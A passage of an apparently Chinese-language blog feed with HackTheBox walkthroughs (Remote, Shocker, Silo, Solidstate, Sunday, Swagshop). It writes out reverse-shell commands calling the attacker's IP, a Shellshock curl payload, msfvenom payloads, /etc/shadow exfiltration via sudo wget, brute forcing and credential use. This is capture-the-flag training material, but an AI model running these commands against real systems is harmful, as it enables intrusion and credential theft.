<h3 id="CVE-2019-18988"><a href="#CVE-2019-18988" class="headerlink" title="CVE-2019-18988"></a>CVE-2019-18988</h3><p>进程找到TeamViewer7</p>
<p><img src="/images/Remote/26.png" alt="26"></p>
<p>枚举版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(Get-Command &quot;C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe&quot;).version</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/27.png" alt="27"></p>
<p>meterpreter有一个自动化提权:<a href="https://github.com/rapid7/metasploit-framework/pull/12900/files">https://github.com/rapid7/metasploit-framework/pull/12900/files</a></p>
<p><img src="/images/Remote/28.png" alt="28"></p>
<p>有了凭据就好办 ，对方5895开放，直接evil-winrm</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil-winrm -u administrator -p &#39;!R3m0te!&#39; -i 10.10.10.180</span><br></pre></td></tr></table></figure>

<p><img src="/images/Remote/29.png" alt="29"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:ScriptKiddie</title>
    <url>/2021/02/08/HTB-ScriptKiddie/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c7dcea351257d525065abdb456f3e2de2fa17b4a2d1d884d449db6c22e9cc222">6b83b1484c1bd4d3cb7f0b3881091a91a774fb14c809132c1ed25e43ada5219ed726bd35c8903d502e83f263c5ca3c081da4810ac3d86b9dc298b9e1b22a55decdcd8a3b9bd903698fc8266ad631a6f3d1ebfa01e9c9c964af4c219a699be1dde2f5e9f91c4b0ee91dc00c0ca9492237eb996d65d829a8ebf9fc837deaa1157187f78cb47ca669d47b966d85f19338946f508c774f13f4f5148b331de1e8267d106d754251afd14660305c9d3e80d8f2ea1fb64efe43a462e9817ef46291eeac6da1b87920ee83dedb85e2d691737c28bb10591133d77ccc7fd56b0d77d79054dbee5862934966236795d9f593bd9b51bba86b12f5905f3b685b8169d128cf3eb9de05bb30ff54d13799ebe090dbb8db4927bfd3333bdd52726ecfb6e0fadc19c538ae3083a35331aa6d23638b1a3ba2e2be464201337b6f0f87ba9b194584b3c5d61192aaf50e2524ecac4aa3d15035b331eba1dcc89a2f929a98bdc17b89496bb48929050ec21e4af0ebf7d11b5792d0abdbec2a241bf445a28f758aa60f09597e54101ca9e60dcfdfd29b9244af7a6cc7939f5fd28bc9e3d5c2f30c0b8ec220f4233e0e4f919e72a87cc9e57a4414aff9e089d49190f85dd549827eaa795b9b9a60e5e1e31822172fd59aea7cd572c93e284577fa593bdbb057999a8bb265ea4ac23628d64d7f0056d9917603cf1ac1cf1bc70dbc0dfb793cc77ac7fbaf953fc53c4a65a33dab59b639bf7c61e0e68383c0a427a71bd756ef5dba2b897a0b085188c8a503374c249240066ba73fb30264ab0baea950c88b8897b95844b17ae05302b2c0073e8921656eae5261d717f8bf6086dc8ad83709c35c7f63fba12ac1e03039890b313756f59ae9e9de171ed358d6e39ed571763ce8b5a2edd58a6ac38cf7581856087edd3fdc00cd704bd3aa45ad73dd3bda989cbfb82494bddafb54865e4bad269b9e87934e7a49a64cd804e7114fbe17da6c23f5626e77248dc731c4550a60481af0f541931d7f9ac21e3f4585a7ded3c9cd849738d810d56838449042f0f8df60b055971e0fe5081f6fa82ffb7b7d24c8f2a5b508f0efacf8d9e8134d2d2875d2a6dced3ebb7e1c6d9b2dc20771a3be7207dde44b6eb554debc5471ddd6359023ce6065d7a2cf809925aa6f719fb52926f96af17ece2c3c47f73dbf4f306f571e64427494bdcc7d0d4f5386e44c7554ec0a6748cdc60d32d94754c7218ccc9c11e4876d7e5916d7af6829b332212f32d1272701745df828b2a7a98a160dd9c3188dd9601bcb219265743df92924234057a37a1d12d3f3f344a9455de0b876131a021e2bc1863b09aa05159218eb066881276794ef22b7786743f6872a49fcbf9ca63ad24fea50ffc9d8a715fe53b286d76853ec1925b0ef3f9b664dab754ff6798bb9b3600690a3c6a04abdb5cc78c9d4ab619031a691db454c08a25cc044406ce1b637d775056339a8769bf5d5784783226d0bb51c13245bf621eec11fec123cd84890f68ce17cb203da93556cfec977dab8b8b3ac67840a9906579d5b9137527a91275a31f94a0f90d7cee74d6d95a26e2b606705bfb50d9c02d252f6c63b6af188c78c5dae85789c830f5b043f243c45e91a5f277134ce66ec66794a8bfd0be37365d37a87c1128a42cf2be7deb7fc6c1b53c7c4e4c469f706789453d44716e4139f4fc52d6034634a72087b4d0459647113c580f6e22bc1db12cfbbc1dfc0fbe8f27a4014fd08eb41b4b032bd6e70f4f665d89480b6952ec125f1d7a3d249dac8caec64c437b05a9ef8f6e338e52723c0a57fa73c026c6bd14e3f2b6d5d356aa8017ff7284322a46c04739ceded1d9ca308198714bf6fb735b3f8ce15062105ebeaffdb9bbf6e3ab14239a7a1aa496b7def35156e92002926f1540659a13c545019c3797f5d28bc3628def9321948d3dd6357b37bd0f2bbfc185dbfdbfc428e0da258551e64d9aeb674fb02eb628869c8ecc15045581d0c17c59dc40bf5e912b5f7d59a2769b000d50459b60f9ae60e80f849c079150d71e1090c4b177d11dbaeac36689ed945592ddb6f9161bbff4c8403c3916f0fd9592b7bbd6ce59b0c9f05f4b65d8d36420f5b620ca4b6222dbffe28c8c7e85b6e9f6e32070b866bff4a84243e8e0ddc2835cbfb7cde5da42793a919bdd6a8fd18706521d9d23c770106ad84a5e11d5a0e9796e125c811dde873c08edf01a03c414696dc04124b00df1fb2149b18df6ebecd0e609e792780a28a48399d883c6176e4a150eafe0b7db3fbf4777e0db1477bd02fcfa8d85b17745586af7ee418edae0d6fef1d9b7bdead9ec924aee831ea2d8ebaab576ac45501b2a3403c84ef1fe501e54fb9c7475312e65a09d45aea4632b35db83c0ee50d8442c4088707abc28addaa60f432fe6c86c89d1b7a96a9e6973bbf0a3fb1c28796f7cda33dbb4e1fb066954b442e5acce2e48fdea203462baa7c94a708c342635218de0e5e3ca22c6a8e9496de3c77011cb8eb64e0a3886d04536274c8c1da9e5cad780b0f013dca7c13b45dddc9a7506b61def549cdfb7330eb27d37f75b9f013f8637afde7240d4d400b7d9a4ae6580afaad8a4548e7cb0e82a2f0e1540d81c32be5daefffa0257bf26be87c0e4e56f8e1da5be0b502d701ff9f4a35899a78b7d0a1ef7ee2beff25154fec9d93c31c7fc33faeffe93fbdb132f03ea52ffdc74f30aeca1ceb3d0564f10664d9f80101865e440ea4891c9b039563cc6c5b2b528ce2ae1d4c8c58a97a17e82b1d56e279b76a8effd413777b27b0b4111d7f03f6b464d8e254c988de8eefaf3b281825c91879cb961becdb89c7957076ffb1663f9cedb73d47c882c8abf4c77fa4bf269142f64bb115adba982fdbcaa16ee96617eaa36711c0893aba7a80c7522fbda13f429960f81476fb9e90ac38c3092bf97d63f2ef8c57041ea0369a79c6d2d2496656f89fb5e6127d745bce14707d7ae3e6ebbcffd95d77dda1c9168c9ffa74421bdaf69a89e5cde1512f2896c686a35e47c2ecdea7d0dbb7fcd9f17419ecbae53beeb90f7990235d54d7076630738b371453a012b36d80d867f74c7a25f29ae34fc0ec09529ee1b57af9a652a94a242870632663a0bf81fc22fb894325aa18627ad5bb037c7c0e1b53c083f9917d8208f574642d5e8879c7221cfb1a67ed712ea1b91e8c13ca1eb90c1322eff9d56ccdc58d0aaf43d03c967e14add4729073d333ed7d23f71e1a2317217bb84a88467f79c1a69c39cc8121ee71f6a5e30afcd3d45bfdebe6c2e4b0aa31dd73b8f4f0181f9f68384f2566468b80e3228819e88b12198548d3307d5629970a631283a170fdb1755abd3cab2acaaa648ee2dcea08237c53c5e46d10862144e78f1c65a9e8cb579c0f61391ea95c399d404e480de5cb1743428798c8043bba9214074cd9803332e5b1f05bd94fd5e3e36fcbba57211338b4396eb8d2f1e5386e516187ae3c11e1525d285d5b649ce9c024c5a31724fded0d118be8793c9e8886e2709c7c48ed54e00a2a969befde759790c9b61ba42915391dce01ef49801c3f4c982ec0306c582476854913e56f108d694ae1b6ae01f90db875feac86f7497d03a9f93d817274f4aebfa8d1fc2d4d0c9992428eeb29e88dd1ff9e807de52bed89143df92804497c478c2779444d32b5ef953ee0b94464de92b966eaa44f369e170e71978a2499b837b41bbd823a800e442e4cdbbcbcf719596fadcd60f85ace35c3c3ba7e2d1f67acd66e5db059656830f498f34ff01c0f0785c50e391c8ac62c3b679e1af05ea2daa60b32e611a8c40f3ac5bd0baf24801fde24073f1b45f38af8edd5b3585ea75e5d2b2d5ace0ef2c66ddf20374fd0e505a9fdddd958f4f59f3ca496346ea6b38db36ac70b4e86bc79392b8cc2b5a9d6fc9624d87e3c74be44a12f12b13e4865b998019f7af4c56c7ed61ef3d0e068073a343d5b0dc64b7dc2c234f71736dbb186443e812ee36104a1eddc03e6bd6cd3d23ea0f2124c9d89ae8cd18f5fec8b6acb1bca309218bffb3319d9c5d7f98599ffb4a80bc07c02e892e7d855988971ad530acd812e49b305451d54aa0b622206d8512865018b80bb98f5950eff009cc0bc89385340f90a4a3130adf437cc6837f83e485921a0a2a7212903a19886a0d1c013b5caa7fd9c16cc24a32278a0cd901e381a19b93ed5c32285c848aa1720f333c4e668e0040e162c693dfff176cc3b936c2874e4e9aaea1e4271bb34d501558c16ce7729f8e967d5a70a5283b7a5eba8902359c07d4e89012473fe57f89354acc7d4350fffae5013d1cad6a6aa5971fe2fe090ecf4edcf2b425670d96c98a7cf9227b6edf6795a51ef5adfe46abc8a704bbfdfb01eaf2a19bfdf70231e4ee0037c3db9389f0a24af63763e2ca2f81b19934068baa8bb691788f60d121ba81d92f9fdcc2d1f649091f6cb5509a98e64ca7879c72c4182a7387880cfb25c33119e2a57d7778ba56416824a3774432332eb1c0bc2694948ef9989e357e31169979759086079113cac3dcd890fdb092aefd78977bddee7f2576cb1512c5a226c98bf8a56237c3873b6954020ce4358e5f44e4d83f5e63474b16ba7188f4567c6081eafc2e04087023a22e1406eaf87199db65541f5e0dc48dcf9b7201452760885db489a37c1976c9c51e97d4c9774246105cf7c6f5e5876da3f3b928bdad7211718882281b58bfad98e342db1df4d9b0f1b0693851583fcd3</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">尚未退休root hash($6...V0)</span>
      </label>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Shocker</title>
    <url>/2020/06/06/HTB-Shocker/</url>
    <content><![CDATA[<h1 id="Shocker"><a href="#Shocker" class="headerlink" title="Shocker"></a>Shocker</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Shocker/1.jpg" alt="1"></p>
<p>只发现了SSH和HTTP服务</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问80端口</p>
<p><img src="/images/Shocker/2.jpg" alt="2"></p>
<p>主页面上什么都没有<br>进行目录枚举</p>
<p><img src="/images/Shocker/3.jpg" alt="3"></p>
<p>发现了目录cgi-bin<br>对其进行文件枚举</p>
<p><img src="/images/Shocker/4.jpg" alt="4"></p>
<p>在这其中我发现一个文件</p>
<p><img src="/images/Shocker/5.jpg" alt="5"></p>
<p>下载后进行查看</p>
<p><img src="/images/Shocker/6.jpg" alt="6"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>google搜索<code>cgi-bin exploit</code>，发现了一个名为shellshock的漏洞</p>
<p>漏洞介绍</p>
<blockquote>
<p>Apache有一个mod_cgi模块，专门用来处理CGI脚本的执行。<br>CGI是一种协议，旨在允许web服务器直接执行服务器中类似控制台程序，这些程序也就是CGI脚本，通常用来处理来自动态网页的数据并通过HTTP进行交互。<br>必须指定一个新目录，通常是cgi-bin或者类似的名字，以使CGI脚本能够运行。当浏览器请求CGI目录中包含的特定文件的URL时，服务器运行该脚本，并将输出传递回浏览器。<br>运行CGI脚本时，会将特定信息复制到环境变量中。如果被调用，该信息将随后传递给Bash，从而为攻击者提供了一种注入恶意代码的方法。</p>
</blockquote>
<h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h3><p>先进行扫描，确认漏洞存在</p>
<p><img src="/images/Shocker/7.jpg" alt="7"></p>
<p>扫描后发现，id命令执行成功，需要特别注意的是<code>TARGETURI</code>指向脚本地址</p>
<p><img src="/images/Shocker/8.jpg" alt="8"></p>
<p>之后成功getshell</p>
<h3 id="不使用msf"><a href="#不使用msf" class="headerlink" title="不使用msf"></a>不使用msf</h3><p>POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -H &#39;User-Agent: () &#123; :; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.132&#x2F;4444 0&gt;&amp;1&#39; http:&#x2F;&#x2F;10.10.10.56&#x2F;cgi-bin&#x2F;user.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Shocker/9.jpg" alt="9"></p>
<p>另外，searchsploit里<code>34900.py</code>也可以使用</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Shocker/10.jpg" alt="10"></p>
<p>发现perl可以以root执行，直接进行提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;</span><br></pre></td></tr></table></figure>

<h3 id="升级交互式shell"><a href="#升级交互式shell" class="headerlink" title="升级交互式shell"></a>升级交互式shell</h3><p>该机器上装有python3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Shocker/11.jpg" alt="11"></p>
<p>获取flag</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Silo</title>
    <url>/2020/06/19/HTB-Silo/</url>
    <content><![CDATA[<h1 id="Silo"><a href="#Silo" class="headerlink" title="Silo"></a>Silo</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Silo/1.jpg" alt="1"></p>
<p>扫描出了大量端口，比如HTTP、SMB、Oracle</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>进行http目录扫描，不过没扫出有价值的信息，大部分都是403</p>
<p>smb进行匿名访问 ，发现不可以访问，再使用nmap vuln扫描，没发现可以利用的漏洞</p>
<p>只能对oracle进行枚举了，使用工具<a href="https://github.com/quentinhardy/odat">ODAT</a>(oracle database attacking tool)<br>直接使用apt安装即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odat -h			&#x2F;&#x2F;先查看可以使用的模块</span><br><span class="line">odat [module] -h	&#x2F;&#x2F;再查看模块的参数，之后填写使用即可</span><br></pre></td></tr></table></figure>

<p>首先枚举用户ID(SID)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odat sidguesser -s 10.10.10.82 -p 1521</span><br></pre></td></tr></table></figure>

<p>默认使用字典<code>sids.txt</code></p>
<p><img src="/images/Silo/2.jpg" alt="2"></p>
<p>枚举出了用户XE和XEXDB</p>
<p>之后进行账户密码枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odat passwordguesser -s 10.10.10.82 -p 1521 -d XE</span><br></pre></td></tr></table></figure>

<p>默认使用字典<code>accounts.txt</code><br>我第一次枚举什么也没枚举出来，经检查，是字典的问题，全部都是大写<br>可以使用mousepad→选中全部内容→Edit→Convert→To Lowercase<br>之后使用命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file &#x2F;root&#x2F;Desktop&#x2F;accounts.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Silo/3.jpg" alt="3"></p>
<p>这次我们获取了账号密码<br>scott/tiger</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>生成木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp lhost&#x3D;10.10.16.150 lport&#x3D;4444 -f exe -o evil.exe</span><br></pre></td></tr></table></figure>

<p>上传<br>注意remotepath填写c:/而不是c:\</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odat utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:&#x2F; evil.exe &#x2F;root&#x2F;Desktop&#x2F;evil.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Silo/4.jpg" alt="4"></p>
<p>执行木马获取shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odat externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:&#x2F; evil.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Silo/5.jpg" alt="5"></p>
<p>之后获取了system shell</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Solidstate</title>
    <url>/2020/06/19/HTB-Solidstate/</url>
    <content><![CDATA[<h1 id="solidstate"><a href="#solidstate" class="headerlink" title="solidstate"></a>solidstate</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/solidstate/1.jpg" alt="1"></p>
<p>注意到该机器运行着web服务和apache james</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="查看敏感邮件getshell"><a href="#查看敏感邮件getshell" class="headerlink" title="查看敏感邮件getshell"></a>查看敏感邮件getshell</h3><p>在网上搜索到了james的默认账号密码<code>root/root</code></p>
<p><img src="/images/solidstate/2.jpg" alt="2"></p>
<p>尝试登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 10.10.10.51 4555</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">help					&#x2F;&#x2F;查看可用指令</span><br><span class="line">listusers				&#x2F;&#x2F;列出可用账户</span><br><span class="line">setpassword [username] [password]			&#x2F;&#x2F;修改账户密码</span><br></pre></td></tr></table></figure>

<p><img src="/images/solidstate/3.jpg" alt="3"></p>
<p>利用修改密码修改所有账户的密码</p>
<p><img src="/images/solidstate/4.jpg" alt="4"></p>
<p>接着逐个登录，查看每个人的邮件信息，在mindy用户中发现了ssh登录信息<br>这里用nc没回显，用telnet就好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 10.10.10.51 110</span><br><span class="line">USER mindy</span><br><span class="line">PASS toor</span><br><span class="line">list</span><br><span class="line">retr 2</span><br></pre></td></tr></table></figure>

<p><img src="/images/solidstate/5.jpg" alt="5"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh mindy@10.10.10.51</span><br><span class="line">P@55W0rd1!2@</span><br></pre></td></tr></table></figure>

<p><img src="/images/solidstate/6.jpg" alt="6"></p>
<p>成功获取shell<br>不过</p>
<p><img src="/images/solidstate/8.jpg" alt="8"></p>
<p>是一个受限的shell(rshell)</p>
<h4 id="方法1shell逃逸"><a href="#方法1shell逃逸" class="headerlink" title="方法1shell逃逸"></a>方法1shell逃逸</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh username@IP -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/solidstate/9.jpg" alt="9"></p>
<p>通过这样的方法就可以得到无限制的交互式shell</p>
<h4 id="方法2RCE-getshell"><a href="#方法2RCE-getshell" class="headerlink" title="方法2RCE getshell"></a>方法2RCE getshell</h4><p>寻找公开漏洞</p>
<p><img src="/images/solidstate/7.jpg" alt="7"></p>
<p>发现了RCE漏洞，这个漏洞会在任何账户登陆后执行，所以我们只需要修改想要执行的payload，比如reverse_shell连接</p>
<p><img src="/images/solidstate/10.jpg" alt="10"></p>
<p>执行exploit</p>
<p><img src="/images/solidstate/11.jpg" alt="11"></p>
<p>之后监听端口，只要我们登录ssh，即可获取一个新shell</p>
<p><img src="/images/solidstate/12.jpg" alt="12"></p>
<p>升级为交互式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">Ctrl+Z</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>

<p><img src="/images/solidstate/13.jpg" alt="13"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="cronjobs"><a href="#cronjobs" class="headerlink" title="cronjobs"></a>cronjobs</h3><p>发现拥有写权限的文件</p>
<p><img src="/images/solidstate/14.jpg" alt="14"></p>
<p>发现root执行的计划任务</p>
<p><img src="/images/solidstate/15.jpg" alt="15"></p>
<p>修改文件为reverse_shell即可，payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;opt</span><br><span class="line">echo &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.16.150&#39;,5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;])&quot; &gt; tmp.py</span><br></pre></td></tr></table></figure>

<p><img src="/images/solidstate/16.jpg" alt="16"></p>
<p>最后获取root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Sunday</title>
    <url>/2020/06/25/HTB-Sunday/</url>
    <content><![CDATA[<h1 id="Sunday"><a href="#Sunday" class="headerlink" title="Sunday"></a>Sunday</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Sunday/1.jpg" alt="1"></p>
<p>发现了不常用端口79，finger服务可以查看当前系统用户信息<br>ssh开在了22022</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>使用finger-user-enum进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">finger-user-enum.pl -U &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -t 10.10.10.76</span><br></pre></td></tr></table></figure>

<p>发现账户sunny和sammy</p>
<p><img src="/images/Sunday/3.jpg" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">medusa -f -u sunny -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -M ssh -n 22022 -h 10.10.10.76</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sunday/4.jpg" alt="4"></p>
<p><code>sunny/sunday</code></p>
<p>使用ssh进行连接，需要指定端口22022</p>
<p><img src="/images/Sunday/2.jpg" alt="2"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在根目录发现了backup文件夹</p>
<p><img src="/images/Sunday/5.jpg" alt="5"></p>
<p>发现了sammy的hash，尝试破解<code>$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sunday/6.jpg" alt="6"></p>
<p>成功破解出密码<code>cooldude!</code><br>成功切换账号</p>
<p><img src="/images/Sunday/7.jpg" alt="7"></p>
<p>并且发现，我能够以root运行wget</p>
<p>接收发送的shadow文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget --post-file&#x3D;&#x2F;etc&#x2F;shadow 10.10.16.99:4444</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sunday/8.jpg" alt="8"></p>
<p>修改root密码为我们知道的密码就可以了</p>
<p>覆盖shadow</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo wget http:&#x2F;&#x2F;10.10.16.99&#x2F;shadow -O shadow</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sunday/9.jpg" alt="9"></p>
<p>方法2</p>
<p>sunny用户有一个可以以root运行的shell脚本，利用sammy的wget覆盖那个shell脚本，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">bash</span><br></pre></td></tr></table></figure>

<p>之后sudo运行那个脚本，也可以获得shell</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Swagshop</title>
    <url>/2020/06/27/HTB-Swagshop/</url>
    <content><![CDATA[<h1 id="Swagshop"><a href="#Swagshop" class="headerlink" title="Swagshop"></a>Swagshop</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Swagshop/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问80</p>
<p><img src="/images/Swagshop/2.jpg" alt="2"></p>
<p>发现目标正在运行应用magento</p>
<p>搜索公开漏洞</p>
<p><img src="/images/Swagshop/3.jpg" alt="3"></p>
<p>发现了RCE漏洞</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>修改exp，删除非python注释，还有目标地址</p>
<p><img src="/images/Swagshop/4.jpg" alt="4"></p>
<p>脚本运行成功，创建了admin账户<code>forme/forme</code>并且给出了后台地址</p>
<p><img src="/images/Swagshop/5.jpg" alt="5"></p>
<p>直接登录</p>
<h3 id="修复exp"><a href="#修复exp" class="headerlink" title="修复exp"></a>修复exp</h3><p>继续搜索公开漏洞</p>
<p><img src="/images/Swagshop/7.jpg" alt="7"></p>
<p>尝试通过认证的情况下的RCE</p>
<p>需要修改很多地方，首先根据提示，访问<code>/app/etc/local.xml</code>获取时间</p>
<p><img src="/images/Swagshop/6.jpg" alt="6"></p>
<p>并填写上正确的账号名称</p>
<p><img src="/images/Swagshop/8.jpg" alt="8"></p>
<p>之后运行会报错，是正则出了问题，替换这4行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">br.form.new_control(&#39;text&#39;, &#39;login[username]&#39;, &#123;&#39;value&#39;: username&#125;)  # Had to manually add username control.</span><br><span class="line">br.form.fixup()</span><br><span class="line">br[&#39;login[username]&#39;] &#x3D; username</span><br><span class="line">br[&#39;login[password]&#39;] &#x3D; password</span><br></pre></td></tr></table></figure>

<p>改成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">userone &#x3D; br.find_control(name&#x3D;&quot;login[username]&quot;, nr&#x3D;0)</span><br><span class="line">userone.value &#x3D; username</span><br><span class="line">pwone &#x3D; br.find_control(name&#x3D;&quot;login[password]&quot;, nr&#x3D;0)</span><br><span class="line">pwone.value &#x3D; password</span><br></pre></td></tr></table></figure>

<p>再次运行，又报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AttributeError: &#39;NoneType&#39; object has no attribute &#39;group&#39;</span><br></pre></td></tr></table></figure>

<p>这是因为过去7天没有销售，需要修改</p>
<p><img src="/images/Swagshop/9.jpg" alt="9"></p>
<p>改成<code>2y</code>代表2年</p>
<p>最后RCE成功</p>
<p><img src="/images/Swagshop/10.jpg" alt="10"></p>
<p>整个调试过程中，重要的是打开代理选项</p>
<p><img src="/images/Swagshop/11.jpg" alt="11"></p>
<p>这样才能不断调试</p>
<p>最后获取shell，payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 37811.py http:&#x2F;&#x2F;10.10.10.140&#x2F;index.php&#x2F;admin&#x2F; &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.100&#x2F;4444 0&gt;&amp;1&#39;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Swagshop/12.jpg" alt="12"></p>
